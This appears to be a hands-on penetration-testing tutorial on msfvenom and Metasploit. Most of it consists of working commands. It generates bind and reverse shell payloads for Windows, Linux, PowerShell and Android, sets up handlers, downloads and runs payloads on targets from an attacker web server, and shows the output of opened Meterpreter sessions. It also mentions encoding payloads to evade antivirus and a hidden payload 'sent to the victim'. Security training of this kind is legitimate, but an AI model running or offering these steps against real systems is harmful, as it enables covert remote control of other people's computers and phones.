## Msfvenom:

Msfvenom is a versatile command-line tool included in the Metasploit Framework, primarily used for generating and encoding payloads, as well as combining these payloads with various exploit formats. It's a powerful tool for penetration testing and security assessments.

#### Features of Msfvenom:
- Payload Generation:
    - Generate payloads for a wide variety of platforms (Windows, Linux, Android, macOS, etc.).
    - Supports shellcode, executables, and other types of payloads.

- Encoding:
    - Encode payloads to evade detection by antivirus software or intrusion detection systems (IDS).
    - Supports multiple encoding techniques (e.g., base64, shikata_ga_nai).

- Multiple Formats:
    - Generate payloads in various formats such as .exe, .elf, .apk, .bin, .raw, .py, etc.
    - Combine payloads with exploits or existing binaries.

- Customizable Payloads:
    - Configure payload options like IP address, port, and more.
    - Chain payloads with encoders for advanced custom attacks.


#### Requirements:
- Kali or Parrot Linux
- Windows Machine
- Android Phone
- Linux Machine




#### Key Options:

- `-p` , `--payload`	: Specify the payload
- `-f` , `--format`	    : Output format or file extension (exe, elf, apk, raw, etc.)
- `-l` , `--list`       : List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
- `-e` , `--encoder`    : Encoder to use
- `-a` , `--arch`       : For the architecture 
- `--platform`          : For the payload platform
- `-i` , `--iterations` : Number of encoding iterations
- `-o` , `--out`        : Save the payload to a file
- `-x` , `--template`   : Specify a custom executable file to use as a template
- `LHOST`	            : IP of local host machine (IP of the attacker machine)
- `LPORT`	            : Local port (any port you wish to assign to the listener)



### Common shells:

The most common types include **bind shells** and **reverse shells**, each serving specific purposes in penetration testing.



### 1. Bind Shell (`bind_tcp)`:

A bind shell is a kind that opens up a new service on the target machine and requires the attacker to connect to it in order to get a session

The target machine opens a specific port and listens for incoming connections from the attacker's machine. The attacker connects to the target machine's open port. Simple to set up on the target machine. Doesn't require the target to connect back to the attacker. Firewalls or network configurations might block incoming connections to the target. Easier to detect by network security tools.


Now, start `msfconsole` and type below command to get a session of the victim machine:

```
msfconsole
```



#### For Windows: [worked]

```
msfvenom -h
```


```
msfvenom -l payloads
```


```
msfvenom -p windows/meterpreter/bind_tcp -f exe > /var/www/html/bind.exe
```


```
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp

set rhost 192.168.10.44
set lport 4444

show options

exploit

exploit -j
```


_Backgrounds the current session:_

```
background


[*] Backgrounding session 1...
```



_Show sessions:_

```
sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  PC-010-NADIF\ISTL-PC-3 @ PC-010-NADIF  192.168.10.193:35883 -> 192.168.10.44:4444 (192.168.10.44)

```


_Quickly switch to another session:_

```
sessions 1
```


```
quit

[*] Shutting down session: 1
```



```
sessions


Active sessions
===============

No active sessions.
```



#### Hidden Bind TCP: [worked]

```
msfvenom -p windows/shell_hidden_bind_tcp ahost=192.168.10.193 lport=1010 -f exe > /var/www/html/hidden.exe
```


This payload hides on the background silently. Once the payload is generated and send to the victim for execution, we will start our next step as shown below.


_Now from the kali Terminal let us type the command:_

```
nc <target_ip> <port>

nc 192.168.10.44 1010


Version 10.0.19045.5247]
(c) Microsoft Corporation. All rights reserved.

C:\Users\ISTL PC-3\Downloads\Programs>
```





#### For Linux: [worked]

```
msfvenom -p linux/x86/meterpreter/bind_tcp -f elf > /var/www/html/bind_shell.elf

msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=4444 -f elf > /var/www/html/bind_shell.elf
```



_Download On Remote (Target) host:_

```
wget http://<attacker-ip>/bind_shell.elf

wget http://192.168.10.193/bind_shell.elf
```


```
chmod +x bind_shell.elf
./bind_shell.elf
```





_Using Metasploit:_

```
use exploit/multi/handler
set payload linux/x86/meterpreter/bind_tcp

set RHOST 192.168.10.192
set LPORT 4444

show options
```


```
exploit
```







### 2. Reverse Shell (`reverse_tcp`)

The target machine initiates a connection back to the attacker’s machine, where the attacker is running a listener. The attacker sets up a listener (e.g., using Netcat or Metasploit). The target machine connects to the attacker’s machine and sends a shell back. Often bypasses firewalls and NAT, as outgoing connections are typically allowed. Harder to detect and block compared to bind shells. Requires the attacker to have a publicly accessible IP or port-forwarding configured.


```
msfconsole
```


#### For Windows: [worked]

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.193 lport=5555 -f exe > /var/www/html/reverse_tcp.exe
```


```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp

set lhost 192.168.10.193
set lport 5555

show options

exploit -j
```



#### For Powershell: [worked]


```
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.10.193 lport=4444 -f raw > /var/www/html/shell_file.bat
```



```
use multi/handler
set payload cmd/windows/reverse_powershell

set lhost 192.168.10.193
set lport 4444

run
```





#### For Linux: [worked]

The `elf` part specifies the output format of the payload, and "ELF" refers to the **Executable and Linkable Format**, which is a standard file format for executable files, shared libraries, and core dumps in Linux systems. It is the native binary format used on Linux and Unix-like operating systems.


```
msfconsole
```


```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.10.193 lport=6666 -f elf > /var/www/html/shell_file
```


```
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp

set LHOST 192.168.10.193
set lport 6666

show options
```


```
scp shell_file root@192.168.10.192:/tmp

or,

wget http://192.168.10.193/shell_file
```


_Run on Remote host:_
```
chmod u+x shell_file

./shell_file
```



```
exploit

[*] Started reverse TCP handler on 192.168.10.193:6666
[*] Sending stage (1017704 bytes) to 192.168.10.192
[*] Meterpreter session 1 opened (192.168.10.193:6666 -> 192.168.10.192:33150) at 2025-01-02 12:35:36 +0530
```






#### For Android: [worked]

```
msfconsole
```


```
msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.10.193 lport=8888 > /var/www/html/file.apk

msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.10.193 lport=8888 -o /var/www/html/test.apk
```


```
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp

set lhost 192.168.10.193
set lport 8888

show options
```


```
exploit
```




Which method works best depends on the available tools and environment. 
